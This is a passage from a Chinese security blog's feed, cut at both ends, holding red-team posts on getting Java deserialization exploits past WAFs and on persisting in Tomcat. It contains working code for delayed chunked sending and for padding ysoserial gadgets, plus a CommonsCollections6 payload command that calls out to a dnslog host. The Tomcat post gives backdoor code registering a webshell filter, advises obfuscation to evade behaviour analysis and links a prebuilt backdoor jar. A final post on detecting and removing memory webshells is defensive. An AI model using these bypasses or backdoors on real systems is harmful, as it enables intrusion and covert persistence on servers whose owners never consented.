延时分块</h2><p>通过测试，发现WAF一般是如下应对分块传输的。</p><ol><li>发现数据包是分块传输，启动分块传输线程进行接收</li><li>分块传输线程不断接收客户端传来的分块，直到接收到<code>0\r\n\r\n</code></li><li>将所有分块合并，并检测合并之后的内容。</li></ol><p>当时和<code>darkr4y</code>师傅交流时，我们曾做过一个设想，<strong>在上一块传输完成后，sleep一段时间，再发送下一块。</strong> 目的是在2阶段延长WAF分块传输线程的等待时间，消耗WAF性能。这时有没有可能WAF为自身性能和为业务让步考虑，而放弃等待所有分块发送完呢？ 。这次正好遇到适合的环境来验证一下想法。</p><p><img src="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/sleep-chunked-bypass-workflow.png" alt="延时分块传输绕WAF流程"></p><p>当然了，我们块与块之间发送的间隔时间必须要小于后端中间件的<code>post timeout</code>,Tomcat默认是20s,weblogic是30s。</p><h2 id="0x03-编码实现"><a href="#0x03-编码实现" class="headerlink" title="0x03 编码实现"></a>0x03 编码实现</h2><p>为了加大WAF的识别难度，我们可以考虑以下3点。</p><ol><li>延时时间随机化</li><li>分块长度随机化</li><li>垃圾注释内容与长度随机化[可选]</li></ol><p>首先我们需要对原始request header进行处理。需要把<code>Content-Length</code>删除，分块传输不需要发送body长度，然后加上<code>Transfer-Encoding: chunked</code>头。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers.remove(<span class="string">"Content-Length"</span>);</span><br><span class="line">headers.put(<span class="string">"Transfer-Encoding"</span>,<span class="string">"chunked"</span>);</span><br></pre></td></tr></table></figure><p>其实调用<code>HttpURLConnection.setChunkedStreamingMode(int chunkedLen)</code>就可以实现分块发包。不过这个接口只能设置固定分块长度，而且无法直接控制分块时间间隔。于是我打算用socket来模拟发送http/https分块传输包，这样要灵活的多。以下是实现的简化代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.连接目标服务器</span></span><br><span class="line">Socket socket = socket.connect(<span class="keyword">new</span> InetSocketAddress(host, port));</span><br><span class="line">OutputStream osw = socket.getOutputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.发送request header</span></span><br><span class="line">osw.write(reqHeader);</span><br><span class="line">osw.flush();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.随机分块和随机延时发送request body</span></span><br><span class="line">ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(reqBody);</span><br><span class="line"><span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[Util.getRandom(minChunkedLen,maxChunkedLen)];</span><br><span class="line"><span class="keyword">while</span> (byteArrayInputStream.read(buffer) != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// 3.1发送分块长度</span></span><br><span class="line">        <span class="keyword">final</span> String chunkedLen = Util.decimalToHex(buffer.length) + <span class="string">"\r\n"</span>;</span><br><span class="line">        osw.write(chunkedLen.getBytes());</span><br><span class="line">        chunkeInfoEntity.setChunkedLen(buffer.length);</span><br><span class="line">        osw.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2发送分块内容</span></span><br><span class="line">        <span class="keyword">byte</span>[] chunked = Transfer.joinByteArray(buffer, <span class="string">"\r\n"</span>.getBytes());</span><br><span class="line">        osw.write(chunked);</span><br><span class="line">        osw.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3.3延时</span></span><br><span class="line">        <span class="keyword">int</span> sleeptime = Util.getRandom(minSleepTime,maxSleepTime);</span><br><span class="line">        Thread.sleep(sleeptime);</span><br><span class="line">    </span><br><span class="line">        buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[Util.getRandom(minChunkedLen,maxChunkedLen)]; <span class="comment">// 获取新的buffer长度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.发送完毕</span></span><br><span class="line">osw.write(<span class="string">"0\r\n\r\n"</span>.getBytes());</span><br><span class="line">osw.flush();</span><br><span class="line"><span class="keyword">byte</span>[] result = readFullHttpResponse(socket.getInputStream());</span><br></pre></td></tr></table></figure><p>为了方便日后使用，我给<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">chunked-coding-converter</a>插件添加了<code>sleep chunked sender</code>，并添加很多细节功能，比如预估分块数量范围和延时范围，显示每一块发送的内容，长度，延时时间以及发送状态等等。</p><p>这里我直接使用最新版本，将被拦截的数据分成<code>218块</code>，共延时<code>1分46秒</code>发送，最终成功绕过WAF。</p><p><img src="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/bypass-through-sleep-chunked.png" alt="延时分块传输成功绕过WAF"></p><h2 id="0x04-一些零碎"><a href="#0x04-一些零碎" class="headerlink" title="0x04 一些零碎"></a>0x04 一些零碎</h2><p>最后列一点边边角角的东西，当餐后”甜点“，需要请自取。</p><ol><li>只有HTTP/1.1支持分块传输</li><li>POST包都支持分块，不局限仅仅于反序列化和上传包</li><li>Transfer-Encoding: chunked大小写不敏感</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;&lt;code&gt;chunked-coding-converter&lt;/code&gt;在0.2.1以及之前版本是
      
    
    </summary>
    
    
      <category term="安全开发" scheme="http://gv7.me/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="绕WAF" scheme="http://gv7.me/tags/%E7%BB%95WAF/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化数据绕WAF之加大量脏数据</title>
    <link href="http://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/"/>
    <id>http://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/</id>
    <published>2021-08-01T02:15:35.000Z</published>
    <updated>2021-08-07T14:33:37.602Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>前几周有个同事发给我一个授权的站点,需要拿下webshell权限。发现存在Java反序列化漏洞，但是有WAF,ysoserial生成的序列化数据直接就被拦截了。</p><p><img src="/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/blocked-by-waf.png" alt="序列化数据被WAF拦截"></p><p>绕WAF的前提自然是先摸清WAF拦截的规则。我先是把序列化头<code>aced0005</code>删掉，发现还是被拦截了,看来WAF没开启无脑的hw模式。</p><p>接着将序列化数据当中的class名破坏，发现不再拦截了。说明WAF应该是把gadget的class加入了规则。</p><p>考虑到大多数WAF受限于性能影响，当request足够大时，WAF可能为因为性能原因作出让步，超出检查长度的内容，将不会被检查。于是我在序列化头后加了<code>50000</code>个<code>x</code>字符，发现WAf不再拦截，证明这个思路可行！</p><p>这样虽然绕过了WAF，但新的问题也来了。序列化数据是二进制数据，直接手工在burp里加入垃圾数据破坏了序列化数据的结构，后端代码并没有反序列化成功。接下来继续解决这个问题。</p><h2 id="0x02-如何给序列化数据加脏数据？"><a href="#0x02-如何给序列化数据加脏数据？" class="headerlink" title="0x02 如何给序列化数据加脏数据？"></a>0x02 如何给序列化数据加脏数据？</h2><p>我的思路是需要找到一个class可以序列化，它可以把我们的<code>脏数据对象</code>和<code>ysoserial gadget对象</code>一起包裹起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">50000</span>]&#123;<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>....&#125; <span class="comment">//垃圾数据</span></span><br><span class="line">......</span><br><span class="line">ysoserial gadget object</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们要找的class，<strong>第一需要实现<code>java.io.Serializable</code>接口，第二可以存储任意对象</strong> 。这么看来集合类型就非常符合我们的需求。</p><ol><li>ArrayList</li><li>LinkedList</li><li>HashMap</li><li>LinkedHashMap</li><li>TreeMap</li><li>……</li></ol><p>伪代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">arrayList.add(dirtyData); <span class="comment">// 脏数据</span></span><br><span class="line">arrayList.add(gadget);<span class="comment">// gadget</span></span><br><span class="line"><span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/bypass-waf.ser"</span>)).writeObject(arrayList);</span><br></pre></td></tr></table></figure><h2 id="0x03-改造ysoserial"><a href="#0x03-改造ysoserial" class="headerlink" title="0x03 改造ysoserial"></a>0x03 改造ysoserial</h2><p>为了方便日后使用，我们可以改造下ysoserial，让所有gadget都支持添加大量垃圾数据。大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考如下代码和注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirtyDataWrapper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> dirtyDataSize; <span class="comment">//脏数据大小</span></span><br><span class="line">    <span class="keyword">private</span> String dirtyData; <span class="comment">//脏数据内容</span></span><br><span class="line">    <span class="keyword">private</span> Object gadget; <span class="comment">// ysoserila gadget对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DirtyDataWrapper</span><span class="params">(Object gadget, <span class="keyword">int</span> dirtyDataSize)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.gadget = gadget;</span><br><span class="line">        <span class="keyword">this</span>.dirtyDataSize = dirtyDataSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将脏数据和gadget对象存到集合对象中</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 一个包裹脏数据和gadget对象可序列化对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">doWrap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Object wrapper = <span class="keyword">null</span>;</span><br><span class="line">        dirtyData = getLongString(dirtyDataSize);</span><br><span class="line">        <span class="keyword">int</span> type = (<span class="keyword">int</span>)(Math.random() * <span class="number">10</span>) % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span> (type)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                List&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">                arrayList.add(dirtyData);</span><br><span class="line">                arrayList.add(gadget);</span><br><span class="line">                wrapper = arrayList;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                List&lt;Object&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;Object&gt;();</span><br><span class="line">                linkedList.add(dirtyData);</span><br><span class="line">                linkedList.add(gadget);</span><br><span class="line">                wrapper = linkedList;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                HashMap&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">                map.put(<span class="string">"a"</span>,dirtyData);</span><br><span class="line">                map.put(<span class="string">"b"</span>,gadget);</span><br><span class="line">                wrapper = map;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                LinkedHashMap&lt;String,Object&gt; linkedHashMap = <span class="keyword">new</span> LinkedHashMap&lt;String,Object&gt;();</span><br><span class="line">                linkedHashMap.put(<span class="string">"a"</span>,dirtyData);</span><br><span class="line">                linkedHashMap.put(<span class="string">"b"</span>,gadget);</span><br><span class="line">                wrapper = linkedHashMap;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                TreeMap&lt;String,Object&gt; treeMap = <span class="keyword">new</span> TreeMap&lt;String, Object&gt;();</span><br><span class="line">                treeMap.put(<span class="string">"a"</span>,dirtyData);</span><br><span class="line">                treeMap.put(<span class="string">"b"</span>,gadget);</span><br><span class="line">                wrapper = treeMap;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wrapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生产随机字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length 随机字符串长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 随机字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLongString</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        String str = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            str += <span class="string">"x"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Object cc6 = <span class="keyword">new</span> CommonsCollections6().getObject(<span class="string">"raw_cmd:nslookup xxx.dnslog.cn"</span>);</span><br><span class="line">        DirtyDataWrapper dirtyDataFactory = <span class="keyword">new</span> DirtyDataWrapper(cc6,<span class="number">100</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/cc6.ser"</span>));</span><br><span class="line">        objectOutputStream.writeObject(dirtyDataFactory.doWrap());</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码请移步<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker" target="_blank" rel="noopener">ysoserial-for-woodpecker</a>项目。通过如下命令就可以生成带有<code>40000脏数据</code>的CommsonCollects6序列化数据。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-for-woodpecker-&lt;version&gt;.jar -g CommonsCollections6 -a <span class="string">"raw_cmd:nslookup win.4lu19g.dnslog.cn"</span> --dirt-data-length 400000 &gt; cc6-dnslog.ser</span><br></pre></td></tr></table></figure><p> 把<code>cc6-dnslog.ser</code>复制到burp中发送，完美饶过waf收到dnslog!</p><p><img src="/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/bypass-waf.png" alt="成功绕过WAF"></p><h2 id="0x04-留一个小问题"><a href="#0x04-留一个小问题" class="headerlink" title="0x04 留一个小问题"></a>0x04 留一个小问题</h2><p>其实不是所有的集合类都适合用于包裹脏数据和gadget，比如<code>LinkedHashSet</code>,<code>HashSet</code>，<code>TreeSet</code>等类就不适合。至于为何，留给大家思考。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;前几周有个同事发给我一个授权的站点,需要拿下webshell权限。发现存在Java反序列化漏洞，但是
      
    
    </summary>
    
    
      <category term="安全开发" scheme="http://gv7.me/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="绕WAF" scheme="http://gv7.me/tags/%E7%BB%95WAF/"/>
    
  </entry>
  
  <entry>
    <title>一种tomcat中间件留持久化后门的思路</title>
    <link href="http://gv7.me/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/"/>
    <id>http://gv7.me/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/</id>
    <published>2021-04-02T04:19:19.000Z</published>
    <updated>2021-04-23T10:35:43.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在红队行动中，内存马虽然好用，但是它存在的最大的问题是重启之后就失效了。这时候留持久化后门就是一个刚需了。今天简单分享一个构造Tomcat中间件持久化后门的思路。</p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>相信通过<code>@Filter/@Servlet</code>标签来实现Tomcat后门的想法已经被用烂了，这里分享一个比较冷门的接口<code>ServletContainerInitializer</code>。它是<code>Servlet 3.0</code>新增的一个接口，主要用于在容器启动阶段通过编程风格注册web三大组件<code>Filter</code>, <code>Servlet</code>以及<code>Listener</code>，以取代通过web.xml配置注册，减少了对配置的依赖。我们可以用这样的机制来注册一个实现了webshell功能的组件，下面以注册Filter为例简单示范一下。</p><h2 id="0x03-实现"><a href="#0x03-实现" class="headerlink" title="0x03 实现"></a>0x03 实现</h2><p>首先我们编写一个class实现<code>ServletContainerInitializer</code>接口，其中<code>onStartup</code>方法会在Tomcat中间件重启加载当前webapp会优先执行这个方法。通过改方法，我们可以注册一个webshell的filter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.HandlesTypes;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="meta">@HandlesTypes</span>(&#123;MainFilter.class&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainFilterInitializer</span> <span class="keyword">implements</span> <span class="title">ServletContainerInitializer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(Set&lt;Class&lt;?&gt;&gt; set, ServletContext servletContext)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        <span class="comment">// 将webshell filter注册到上下文当中</span></span><br><span class="line">        FilterRegistration.Dynamic filter = servletContext.addFilter(MainFilter.class.getSimpleName(), MainFilter.class);</span><br><span class="line">        EnumSet&lt;DispatcherType&gt; dispatcherTypes = EnumSet.allOf(DispatcherType.class);</span><br><span class="line">        dispatcherTypes.add(DispatcherType.REQUEST);</span><br><span class="line">        dispatcherTypes.add(DispatcherType.FORWARD);</span><br><span class="line">        <span class="comment">// 设置webshell filter的访问路径</span></span><br><span class="line">        filter.addMappingForUrlPatterns(dispatcherTypes, <span class="keyword">true</span>, <span class="string">"/*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在打包jar之前创建一个文件<code>META-INF/services/javax.servlet.ServletContainerInitializer</code>，并填写以上class名即可。</p><p>为了兼容性我们最好使用jdk1.5进行编译，同时为了防止被行为分析我们最好对代码进行混淆。</p><p>最后分享给大家一个我自己做好的一个后门给大家做一个参考。</p><p><a href="tomcat-lib-backdoor-obfuscated.jar">下载地址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;在红队行动中，内存马虽然好用，但是它存在的最大的问题是重启之后就失效了。这时候留持久化后门就是一个刚
      
    
    </summary>
    
    
      <category term="后门" scheme="http://gv7.me/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Filter/Servlet型内存马的扫描抓捕与查杀</title>
    <link href="http://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/"/>
    <id>http://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/</id>
    <published>2020-09-09T15:10:01.000Z</published>
    <updated>2020-10-13T13:36:47.194Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在内存马横行的当下，蓝队or应急的师傅如何能快速判断哪些Filter/Servlet是内存马，分析内存马的行为功能是什么？最终又如何不重启的将其清除？红队师傅又如何抓铺其他师傅的内存马为自己用，亦或是把师傅的内存马踢掉？</p><p>在当下攻防对抗中，一直缺少着针对内存马扫描，捕捉与查杀的辅助脚本。下面就以<code>Tomcat 8.5.47</code>为例子，分享下编写方法，其他中间件万变不离其宗。</p><p>考虑到Agent技术针对红队来说比较重，我们这次使用jsp技术来解决以上问题。</p><h2 id="0x02-扫描Filter和Servlet"><a href="#0x02-扫描Filter和Servlet" class="headerlink" title="0x02 扫描Filter和Servlet"></a>0x02 扫描Filter和Servlet</h2><p>要想扫描web应用内存中的Filter和Servlet，我们必须知道它们存储的位置。通过查看代码，我们知道StandardContext对象中维护的是一个</p><p>和Filter相关的是<code>filterDefs</code>和<code>filterMaps</code>两个属性。这两个属性分别维护着全局Filter的定义，以及Filter的映射关系。</p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/filterMaps-filterRefs.png" alt="filterMaps和filterRefs属性结构"></p><p>和Servlet相关的是<code>children</code>和<code>servletMappings</code>两个属性。这两个属性分别维护这全家Servlet的定义，以及Servlet的映射关系。</p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/servletMappings.png" alt="servletMappings属性结构"></p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/children.png" alt="children属性结构"></p><p>其他request对象中就存储这StandardContext对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;</span><br><span class="line">  -&gt; context &#123;ApplicationContext&#125; </span><br><span class="line">    -&gt; context &#123;StandardContext&#125;</span><br><span class="line">      * filterDefs</span><br><span class="line">      * filterMaps</span><br><span class="line">      * children</span><br><span class="line">      * servletMappings</span><br></pre></td></tr></table></figure><p>所以我们只需要通过反射遍历request，最终就可以拿到Filter和Servlet的如下信息。</p><ul><li>Filter/Servlet名</li><li>匹配路径</li><li>Class名</li><li>ClassLoader</li><li>Class文件存储路径。</li><li>内存中Class字节码（方便反编译审计其是否存在恶意代码）</li><li>该Class是否有对应的磁盘文件（判断内存马的重要指标）</li></ul><p>具体反射遍历代码放文末github，这里值得一提是拿到Class名通过如下方法就能拿到其被加载到内存中的字节码内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] classBytes = Repository.lookupClass(Class.forName(<span class="string">"me.gv7.Memshell"</span>)).getBytes();</span><br></pre></td></tr></table></figure><h2 id="0x03-注销Filter内存马"><a href="#0x03-注销Filter内存马" class="headerlink" title="0x03 注销Filter内存马"></a>0x03 注销Filter内存马</h2><p>通过分析调试Tomcat源码，我们知道Tomcat注销filter其实就是将该Filter从全局filterDefs和filterMaps中清除掉。具体的操作分别如下<code>removeFilterDef</code>和<code>removeFilterMap</code>两个方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeFilterDef</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeFilterDef</span><span class="params">(FilterDef filterDef)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>.filterDefs) &#123;</span><br><span class="line">        <span class="keyword">this</span>.filterDefs.remove(filterDef.getFilterName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.fireContainerEvent(<span class="string">"removeFilterDef"</span>, filterDef);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeFilterMap</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeFilterMap</span><span class="params">(FilterMap filterMap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.filterMaps.remove(filterMap);</span><br><span class="line">    <span class="keyword">this</span>.fireContainerEvent(<span class="string">"removeFilterMap"</span>, filterMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要反射调用它们即可注销Filter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 